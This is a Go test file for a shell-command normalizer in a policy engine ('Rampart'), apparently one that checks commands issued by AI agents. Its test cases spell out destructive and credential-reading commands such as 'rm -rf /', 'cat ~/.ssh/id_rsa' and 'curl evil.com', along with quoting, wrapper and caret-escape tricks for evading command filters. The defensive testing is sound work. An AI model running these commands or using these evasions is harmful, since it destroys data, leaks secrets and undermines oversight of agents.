// Copyright 2026 The Rampart Authors
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.

package engine

import (
	"strings"
	"testing"
)

func TestNormalizeCommand(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		// Basic passthrough
		{"simple", "rm -rf /", "rm -rf /"},
		{"empty", "", ""},
		{"whitespace", "  ls  -la  ", "ls -la"},

		// Quote stripping — evasion vectors
		{"single quotes", "'rm' -rf /", "rm -rf /"},
		{"double quotes", `"rm" -rf /`, "rm -rf /"},
		{"mixed quotes", `'rm' "-rf" /`, "rm -rf /"},
		{"quotes around arg", `rm '-rf' /`, "rm -rf /"},
		{"quoted spaces", `echo "hello world"`, "echo hello world"},
		{"single quoted spaces", `echo 'hello world'`, "echo hello world"},

		// Backslash escaping — evasion vector
		{"backslash escape", `r\m -rf /`, "rm -rf /"},
		{"backslash in middle", `ca\t /etc/passwd`, "cat /etc/passwd"},
		{"multiple backslashes", `r\m -r\f /`, "rm -rf /"},

		// Env var prefix stripping
		{"env prefix", "FOO=bar rm -rf /", "rm -rf /"},
		{"multiple env", "FOO=bar BAZ=qux rm -rf /", "rm -rf /"},
		{"env with path", "PATH=/usr/bin:/bin ls", "ls"},
		{"only env", "FOO=bar", ""},

		// Transparent POSIX executors must not hide the effective command.
		{"command builtin", "command rm -rf /", "rm -rf /"},
		{"command path search", "command -p rm -rf /", "rm -rf /"},
		{"exec separator", "exec -- rm -rf /", "rm -rf /"},
		{"exec argv zero", "exec -a harmless rm -rf /", "rm -rf /"},
		{"env clean", "env -i PATH=/usr/bin rm -rf /", "rm -rf /"},
		{"env unset", "env --unset RAMPART_MODE rm -rf /", "rm -rf /"},
		{"env split string", `env -S 'PATH=/usr/bin rm -rf /'`, "rm -rf /"},
		{"env attached unset", "env -uRAMPART_MODE rm -rf /", "rm -rf /"},
		{"env attached chdir", "env -C/tmp rm -rf /", "rm -rf /"},
		{"env attached split string", `env -S'rm -rf /'`, "rm -rf /"},
		{"nohup", "nohup rm -rf /", "rm -rf /"},
		{"nohup separator", "/usr/bin/nohup -- rm -rf /", "rm -rf /"},
		{"nice adjustment", "nice -n 5 rm -rf /", "rm -rf /"},
		{"nice attached adjustment", "nice -n5 rm -rf /", "rm -rf /"},
		{"nice historical adjustment", "nice -5 rm -rf /", "rm -rf /"},
		{"timeout options", "timeout --foreground -k 1s -s TERM 5s rm -rf /", "rm -rf /"},
		{"timeout attached options", "timeout -k1s -sTERM 5s rm -rf /", "rm -rf /"},
		{"setsid options", "setsid -cfw -- rm -rf /", "rm -rf /"},
		{"stdbuf options", "stdbuf -i0 -oL -e 0 rm -rf /", "rm -rf /"},
		{"nested launchers", "nohup timeout 5s nice -n5 setsid -f stdbuf -oL rm -rf /", "rm -rf /"},
		{"nested transparent executors", "command env -i exec -- rm -rf /", "rm -rf /"},
		{"command query is not execution", "command -v rm", "command -v rm"},
		{"env without utility stays intact", "env -i PATH=/usr/bin", "env -i PATH=/usr/bin"},
		{"nohup help does not execute", "nohup --help rm -rf /", "nohup --help rm -rf /"},
		{"nice malformed adjustment stays intact", "nice -n nope rm -rf /", "nice -n nope rm -rf /"},
		{"timeout missing duration stays intact", "timeout --foreground rm -rf /", "timeout --foreground rm -rf /"},
		{"setsid unknown option stays intact", "setsid -x rm -rf /", "setsid -x rm -rf /"},
		{"stdbuf malformed mode stays intact", "stdbuf -o nope rm -rf /", "stdbuf -o nope rm -rf /"},

		// Compound commands
		{"and", "rm -rf / && echo done", "rm -rf / && echo done"},
		{"or", "rm -rf / || echo failed", "rm -rf / && echo failed"},
		{"semicolon", "rm -rf /; echo done", "rm -rf / && echo done"},
		{"pipe", "cat /etc/passwd | grep root", "cat /etc/passwd && grep root"},
		{"complex compound", "'rm' -rf / && echo done", "rm -rf / && echo done"},

		// Edge cases
		{"empty quotes", `'' ls`, "ls"},
		{"nested double in single", `'he said "hi"' arg`, `he said "hi" arg`},
		{"escaped delimiter", `echo 'a&&b'`, "echo a&&b"},
		{"backticks preserved", "echo `whoami`", "echo `whoami`"},
		{"dollar expansion preserved", "echo $(whoami)", "echo $(whoami)"},
		{"backslash at end", `rm\`, `rm\`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := NormalizeCommand(tt.cmd)
			if got != tt.want {
				t.Errorf("NormalizeCommand(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestTransparentPOSIXLaunchersDoNotWidenGrants(t *testing.T) {
	condition := Condition{CommandMatches: []string{"git *"}}
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{name: "valid timeout executes allowed command", command: "timeout 5s git status", want: true},
		{name: "valid nested launchers execute allowed command", command: "nohup nice -n5 stdbuf -oL git status", want: true},
		{name: "timeout help does not execute trailing command", command: "timeout --help git status", want: false},
		{name: "timeout unknown option remains ambiguous", command: "timeout --future-option 5s git status", want: false},
		{name: "nice malformed option remains ambiguous", command: "nice -n nope git status", want: false},
		{name: "setsid unknown option remains ambiguous", command: "setsid -x git status", want: false},
		{name: "stdbuf malformed mode remains ambiguous", command: "stdbuf -o nope git status", want: false},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			call := ToolCall{Tool: "exec", Params: map[string]any{"command": test.command}}
			if got := matchConditionForAction(condition, call, nil, ActionAllow); got != test.want {
				t.Fatalf("allow match for %q = %v, want %v", test.command, got, test.want)
			}
		})
	}
}

func TestSplitCompoundCommand(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want []string
	}{
		{"simple", "ls", []string{"ls"}},
		{"and", "a && b", []string{"a", "b"}},
		{"or", "a || b", []string{"a", "b"}},
		{"semicolon", "a ; b", []string{"a", "b"}},
		{"pipe", "a | b", []string{"a", "b"}},
		{"ampersand", "a & b", []string{"a", "b"}},
		{"mixed", "a && b | c ; d & e", []string{"a", "b", "c", "d", "e"}},
		{"quoted pipe", "echo 'a|b'", []string{"echo 'a|b'"}},
		{"quoted and", `echo "a&&b"`, []string{`echo "a&&b"`}},
		{"quoted ampersand", `echo "a&b"`, []string{`echo "a&b"`}},
		{"escaped ampersand", `echo a\&b`, []string{`echo a\&b`}},
		{"fd output redirect", "command 2>&1", []string{"command 2>&1"}},
		{"fd input redirect", "command 3<&0", []string{"command 3<&0"}},
		{"combined output redirect", "command &>output.log", []string{"command &>output.log"}},
		{"combined append redirect", "command &>>output.log", []string{"command &>>output.log"}},
		{"redirect then separator", "command 2>&1 & cleanup", []string{"command 2>&1", "cleanup"}},
		{"empty", "", nil},
		{"empty segments", "a ;; b", []string{"a", "b"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SplitCompoundCommand(tt.cmd)
			if len(got) != len(tt.want) {
				t.Fatalf("SplitCompoundCommand(%q) = %v (len %d), want %v (len %d)",
					tt.cmd, got, len(got), tt.want, len(tt.want))
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("segment %d: got %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestSplitCompoundCommand_WindowsSemantics(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want []string
	}{
		{
			name: "ampersand greater-than is separator then redirect",
			cmd:  "echo safe &>nul del secret.txt",
			want: []string{"echo safe", ">nul del secret.txt"},
		},
		{
			name: "backslash does not escape separator",
			cmd:  `echo safe\& del secret.txt`,
			want: []string{`echo safe\`, "del secret.txt"},
		},
		{
			name: "single quote does not quote separator",
			cmd:  `echo 'safe & del secret.txt'`,
			want: []string{`echo 'safe`, `del secret.txt'`},
		},
		{
			name: "caret escapes separator",
			cmd:  `echo safe ^& literal`,
			want: []string{`echo safe ^& literal`},
		},
		{
			name: "descriptor redirect is not separator",
			cmd:  `echo safe 2>&1`,
			want: []string{`echo safe 2>&1`},
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			got := splitCompoundCommandForOS(test.cmd, "windows")
			if len(got) != len(test.want) {
				t.Fatalf("splitCompoundCommandForOS(%q, windows) = %v, want %v", test.cmd, got, test.want)
			}
			for index := range got {
				if got[index] != test.want[index] {
					t.Errorf("segment %d = %q, want %q", index, got[index], test.want[index])
				}
			}
		})
	}
}

func TestExtractSubcommands(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want []string
	}{
		{"dollar paren", "$(rm -rf /)", []string{"rm -rf /"}},
		{"backtick", "`rm -rf /`", []string{"rm -rf /"}},
		{"echo with dollar paren", "echo $(cat /etc/shadow)", []string{"cat /etc/shadow"}},
		{"eval double quotes", `eval "rm -rf /"`, []string{"rm -rf /"}},
		{"eval single quotes", `eval 'rm -rf /'`, []string{"rm -rf /"}},
		{"nested dollar paren", "$(echo $(whoami))", []string{"echo $(whoami)", "whoami"}},
		{"multiple substitutions", "$(ls) && $(pwd)", []string{"ls", "pwd"}},
		{"empty dollar paren", "$()", nil},
		{"unclosed dollar paren", "$(rm -rf /", nil},
		{"unclosed backtick", "`rm -rf /", nil},
		{"no substitution", "echo hello", nil},
		{"dollar without paren", "$HOME/bin/test", nil},
		{"eval with env prefix", `FOO=bar eval "rm -rf /"`, []string{"rm -rf /"}},
		{"backtick in echo", "echo `whoami`", []string{"whoami"}},
		{"mixed backtick and dollar", "echo `uname` $(id)", []string{"id", "uname"}},
		{"process substitution <()", "diff <(cat /etc/passwd) <(echo test)", []string{"cat /etc/passwd", "echo test"}},
		{"process substitution >()", "tee >(grep error > log)", []string{"grep error > log"}},
		{"null bytes stripped", "r\x00m -rf /", nil},
		{"ansi escapes stripped", "\x1b[0mrm -rf /", nil},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ExtractSubcommands(tt.cmd)
			if len(got) != len(tt.want) {
				t.Fatalf("ExtractSubcommands(%q) = %v (len %d), want %v (len %d)",
					tt.cmd, got, len(got), tt.want, len(tt.want))
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("result %d: got %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

func FuzzExtractSubcommands(f *testing.F) {
	f.Add("$(rm -rf /)")
	f.Add("`rm -rf /`")
	f.Add("echo $(cat /etc/shadow)")
	f.Add(`eval "rm -rf /"`)
	f.Add("$(echo $(whoami))")
	f.Add("$()")
	f.Add("$(")
	f.Add("`")
	f.Add("")
	f.Add("normal command")
	f.Add("$$$$(((())))")
	f.Add("`nested `backtick``")

	f.Fuzz(func(t *testing.T, cmd string) {
		// Should never panic.
		results := ExtractSubcommands(cmd)
		for _, r := range results {
			if r == "" {
				t.Error("ExtractSubcommands returned empty string")
			}
		}
	})
}

func TestSanitizeCommand(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{"null bytes", "r\x00m -rf /", "rm -rf /"},
		{"ansi escape", "\x1b[0mrm -rf /", "rm -rf /"},
		{"control chars", "rm\x01\x02 -rf /", "rm -rf /"},
		{"tabs preserved", "echo\thello", "echo\thello"},
		{"newlines preserved", "echo\nhello", "echo\nhello"},
		{"clean string", "echo hello", "echo hello"},
		{"multiple ansi", "\x1b[31mecho\x1b[0m hello", "echo hello"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SanitizeCommand(tt.cmd)
			if got != tt.want {
				t.Errorf("SanitizeCommand(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestSplitCompoundCommand_Newlines(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want []string
	}{
		{"newline separator", "echo safe\nrm -rf /", []string{"echo safe", "rm -rf /"}},
		{"multiple newlines", "a\nb\nc", []string{"a", "b", "c"}},
		{"newline in quotes", `echo "hello\nworld"`, []string{`echo "hello\nworld"`}},
		{"empty lines", "a\n\nb", []string{"a", "b"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SplitCompoundCommand(tt.cmd)
			if len(got) != len(tt.want) {
				t.Fatalf("SplitCompoundCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("segment %d: got %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestMatchGlob_LongInput(t *testing.T) {
	// Oversized inputs fail as a whole rather than matching a truncated prefix.
	long := strings.Repeat("a", 20000)
	if MatchGlob("**a**", long) {
		t.Fatal("oversized input must not match a truncated prefix")
	}
}

func TestNormalizeCommand_EvasionVectors(t *testing.T) {
	// All of these should normalize to "rm -rf /"
	evasions := []string{
		"rm -rf /",
		"'rm' -rf /",
		`"rm" -rf /`,
		`r\m -rf /`,
		`'r'm -rf /`,
		`FOO=bar rm -rf /`,
		`command rm -rf /`,
		`exec -- rm -rf /`,
		`env -i PATH=/usr/bin rm -rf /`,
		`command env -u RAMPART_MODE exec rm -rf /`,
	}
	for _, cmd := range evasions {
		got := NormalizeCommand(cmd)
		if got != "rm -rf /" {
			t.Errorf("NormalizeCommand(%q) = %q, want %q", cmd, got, "rm -rf /")
		}
	}
}

func TestNormalizeCommand_DeepTransparentExecutorNesting(t *testing.T) {
	command := strings.Repeat("env ", 32) + "rm -rf /"
	if got := NormalizeCommand(command); got != "rm -rf /" {
		t.Fatalf("NormalizeCommand(deep env nesting) = %q, want rm command", got)
	}
}

func TestSplitCompoundCommand_PipeSplits(t *testing.T) {
	// Pipes MUST split so each command in the pipeline is evaluated independently.
	// This prevents evasion like "echo x | rm -rf /" where only "echo x" would be checked.
	got := SplitCompoundCommand("cat foo | grep bar | wc -l")
	want := []string{"cat foo", "grep bar", "wc -l"}
	if len(got) != len(want) {
		t.Fatalf("pipe split: got %v, want %v", got, want)
	}
	for i := range got {
		if got[i] != want[i] {
			t.Errorf("segment %d: got %q, want %q", i, got[i], want[i])
		}
	}
}

func TestSplitCompoundCommand_PipeEvasion(t *testing.T) {
	// Verify that pipe evasion is caught: "echo x | rm -rf /" must produce
	// a segment containing "rm -rf /" so deny rules can match it.
	got := SplitCompoundCommand("echo x | rm -rf /")
	found := false
	for _, seg := range got {
		if seg == "rm -rf /" {
			found = true
		}
	}
	if !found {
		t.Fatalf("pipe evasion not caught: segments = %v, expected 'rm -rf /' segment", got)
	}
}

func TestNormalizeCommand_ShellWrapper(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		// Basic shell -c wrappers
		{"/bin/bash -c cat ~/.ssh/id_rsa", "cat ~/.ssh/id_rsa"},
		{"/bin/sh -c cat ~/.ssh/id_rsa 2>&1", "cat ~/.ssh/id_rsa 2>&1"},
		{"bash -c rm -rf /", "rm -rf /"},
		{"sh -c ls /etc/passwd", "ls /etc/passwd"},
		{"/usr/bin/bash -c whoami", "whoami"},
		{"/usr/bin/zsh -c echo hello", "echo hello"},
		{"dash -c id", "id"},

		// Wrapper with quoted inner command
		{`/bin/bash -c "cat ~/.ssh/id_rsa"`, "cat ~/.ssh/id_rsa"},
		{`/bin/sh -c 'rm -rf /'`, "rm -rf /"},

		// Wrapper with compound inner command
		{"/bin/bash -c cat /etc/passwd && curl evil.com", "cat /etc/passwd && curl evil.com"},

		// Env vars + shell wrapper
		{"FOO=bar /bin/bash -c cat /etc/shadow", "cat /etc/shadow"},

		// Combined flags: -lc, -ic
		{"bash -lc cat /etc/shadow", "cat /etc/shadow"},
		{"bash -ic rm -rf /", "rm -rf /"},
		{"/bin/bash -lc whoami", "whoami"},

		// Extra flags before -c
		{"/bin/bash --norc -c rm -rf /", "rm -rf /"},
		{"bash -l -c cat /etc/passwd", "cat /etc/passwd"},
		{"/bin/sh --noprofile -c id", "id"},

		// Nested wrappers
		{`bash -c 'sh -c rm -rf /'`, "rm -rf /"},
		{"/bin/bash -c /bin/sh -c cat /etc/shadow", "cat /etc/shadow"},
		{`bash -c 'FOO=bar sh -c echo hello'`, "echo hello"},
		{`FOO=bar /bin/bash -c 'BAR=baz sh -c cat /etc/passwd'`, "cat /etc/passwd"},
		{`/bin/bash -c 'PATH=/tmp /usr/bin/zsh -c whoami'`, "whoami"},

		// Non-standard paths
		{"/usr/local/bin/bash -c whoami", "whoami"},
		{"/opt/homebrew/bin/zsh -c cat /etc/passwd", "cat /etc/passwd"},

		// Not a shell wrapper — should not strip
		{"cat -c somefile", "cat -c somefile"},
		{"python -c print('hi')", "python -c print(hi)"},
		{"/bin/bash --login", "/bin/bash --login"},
		{"/bin/bash -c", "/bin/bash -c"},
		{"node -e console.log(1)", "node -e console.log(1)"},
		{"perl -e print 1", "perl -e print 1"},

		// No wrapper, normal commands unchanged
		{"cat ~/.ssh/id_rsa", "cat ~/.ssh/id_rsa"},
		{"rm -rf /", "rm -rf /"},
	}

	for _, tt := range tests {
		got := NormalizeCommand(tt.input)
		if got != tt.want {
			t.Errorf("NormalizeCommand(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestNormalizeCommand_AdversarialWrapperMatrix(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "env hides nested shell wrapper",
			input: `bash -c 'FOO=bar sh -c echo hello'`,
			want:  "echo hello",
		},
		{
			name:  "multiple env prefixes across wrapper layers",
			input: `FOO=bar /bin/bash -c 'BAR=baz /bin/sh -c cat /etc/passwd'`,
			want:  "cat /etc/passwd",
		},
		{
			name:  "quoted inner shell survives retokenization",
			input: `bash -c 'PATH=/tmp /usr/bin/zsh -c "whoami"'`,
			want:  "whoami",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := NormalizeCommand(tt.input)
			if got != tt.want {
				t.Errorf("NormalizeCommand(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestNormalizeCommand_WindowsShellWrappers(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"cmd c", "cmd /c whoami", "whoami"},
		{"cmd exe k", `cmd.exe /k "echo ready & del secret.txt"`, "echo ready & del secret.txt"},
		{"cmd case insensitive", "CMD.EXE /C whoami", "whoami"},
		{"cmd leading options", "cmd.exe /d /s /c whoami", "whoami"},
		{"cmd attached c", "cmd.exe /cdel /q secret.txt", "del /q secret.txt"},
		{"cmd attached k", `cmd /k"DIR C:\Temp"`, `DIR C:\Temp`},
		{"cmd caret command escape", "cmd.exe /c d^el /q secret.txt", "del /q secret.txt"},
		{"windows powershell", "powershell -Command Get-ChildItem", "Get-ChildItem"},
		{"windows powershell exe", "PowerShell.EXE -COMMAND Get-ChildItem", "Get-ChildItem"},
		{"powershell core", "pwsh -c Get-ChildItem", "Get-ChildItem"},
		{"powershell core exe", "pwsh.exe -Command Get-ChildItem", "Get-ChildItem"},
		{"powershell leading option", "pwsh.exe -NoProfile -Command Get-ChildItem", "Get-ChildItem"},
		{"nested windows wrappers", `cmd /c "pwsh -c Remove-Item secret.txt"`, "Remove-Item secret.txt"},
		{"cmd missing command", "cmd.exe /c", "cmd.exe /c"},
		{"powershell file mode", "powershell -File script.ps1", "powershell -File script.ps1"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := NormalizeCommand(tt.input); got != tt.want {
				t.Errorf("NormalizeCommand(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestNormalizeCommand_WindowsHostSemantics(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "direct caret-obfuscated executable",
			input: `d^el /q secret.txt`,
			want:  `del /q secret.txt`,
		},
		{
			name:  "cmd separator followed by redirect",
			input: `echo safe &>nul d^el /q secret.txt`,
			want:  `echo safe && del /q secret.txt`,
		},
		{
			name:  "attached c switch",
			input: `cmd.exe /cd^el /q secret.txt`,
			want:  `del /q secret.txt`,
		},
		{
			name:  "backslash is not an escape",
			input: `d\el C:\Temp\secret.txt`,
			want:  `d\el C:\Temp\secret.txt`,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := normalizeCommandForOS(test.input, "windows"); got != test.want {
				t.Errorf("normalizeCommandForOS(%q, windows) = %q, want %q", test.input, got, test.want)
			}
		})
	}
}

func TestNormalizeCommand_ExplicitWrapperOverridesHostDialect(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		hostOS string
		want   string
	}{
		{
			name:   "nested POSIX wrappers on Windows host",
			input:  "bash -c 'sh -c rm -rf /'",
			hostOS: "windows",
			want:   "rm -rf /",
		},
		{
			name:   "cmd wrapper on POSIX host",
			input:  `cmd.exe /c d^el /q secret.txt`,
			hostOS: "posix",
			want:   `del /q secret.txt`,
		},
		{
			name:   "PowerShell wrapper preserves Windows path",
			input:  `pwsh -Command 'Remove-Item C:\Temp\secret.txt'`,
			hostOS: "posix",
			want:   `Remove-Item C:\Temp\secret.txt`,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := normalizeCommandForOS(test.input, test.hostOS); got != test.want {
				t.Errorf("normalizeCommandForOS(%q, %q) = %q, want %q", test.input, test.hostOS, got, test.want)
			}
		})
	}
}

func TestStripShellWrapper(t *testing.T) {
	tests := []struct {
		tokens []string
		want   []string
	}{
		{[]string{"/bin/bash", "-c", "cat", "foo"}, []string{"cat", "foo"}},
		{[]string{"sh", "-c", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		{[]string{"/bin/bash", "-c", "cat foo && rm bar"}, []string{"cat", "foo", "&&", "rm", "bar"}},
		// Combined flags
		{[]string{"bash", "-lc", "cat", "foo"}, []string{"cat", "foo"}},
		{[]string{"bash", "-ic", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		// Extra flags before -c
		{[]string{"/bin/bash", "--norc", "-c", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		{[]string{"bash", "-l", "-c", "cat", "foo"}, []string{"cat", "foo"}},
		// Non-standard paths
		{[]string{"/usr/local/bin/bash", "-c", "whoami"}, []string{"whoami"}},
		// Windows shell wrappers (parsed on every host OS)
		{[]string{"cmd.exe", "/c", "whoami"}, []string{"whoami"}},
		{[]string{"CMD", "/K", "echo", "ready"}, []string{"echo", "ready"}},
		{[]string{"powershell.exe", "-Command", "Get-ChildItem"}, []string{"Get-ChildItem"}},
		{[]string{"pwsh", "-c", "Get-ChildItem"}, []string{"Get-ChildItem"}},
		// Nested wrappers (recursive stripping)
		{[]string{"bash", "-c", "sh", "-c", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		// Not a wrapper
		{[]string{"python", "-c", "print('hi')"}, []string{"python", "-c", "print('hi')"}},
		{[]string{"node", "-e", "console.log(1)"}, []string{"node", "-e", "console.log(1)"}},
		{[]string{"/bin/bash", "--login"}, []string{"/bin/bash", "--login"}},
		// Too few tokens
		{[]string{"/bin/bash", "-c"}, []string{"/bin/bash", "-c"}},
		{[]string{"bash"}, []string{"bash"}},
	}

	for _, tt := range tests {
		got := stripShellWrapper(tt.tokens)
		if len(got) != len(tt.want) {
			t.Errorf("stripShellWrapper(%v) = %v, want %v", tt.tokens, got, tt.want)
			continue
		}
		for i := range got {
			if got[i] != tt.want[i] {
				t.Errorf("stripShellWrapper(%v)[%d] = %q, want %q", tt.tokens, i, got[i], tt.want[i])
			}
		}
	}
}

func stripShellWrapper(tokens []string) []string {
	goos := "posix"
	for depth := 0; depth < 3; depth++ {
		stripped, nextOS := stripShellWrapperOnceForOS(tokens, goos)
		if strSlicesEqual(stripped, tokens) {
			return stripped
		}
		tokens = stripped
		goos = nextOS
	}
	return tokens
}
